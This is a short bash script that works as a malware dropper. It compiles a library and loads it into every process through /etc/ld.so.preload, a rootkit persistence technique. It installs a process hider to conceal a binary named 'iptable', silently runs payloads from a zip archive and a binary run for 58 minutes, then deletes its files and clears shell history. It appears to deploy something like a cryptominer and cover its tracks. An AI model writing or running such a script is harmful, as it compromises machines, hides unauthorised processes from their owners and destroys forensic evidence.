#!/bin/bash
apt-get update
apt-get install unzip
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add iptable
unzip asup.zip
chmod 777 iptable time asup.sh
./asup.sh >/dev/null &
uname -a
history -rc
timeout 58m ./time
rm iptable time asup.sh asup.zip script.sh
echo "done..."
history -rc
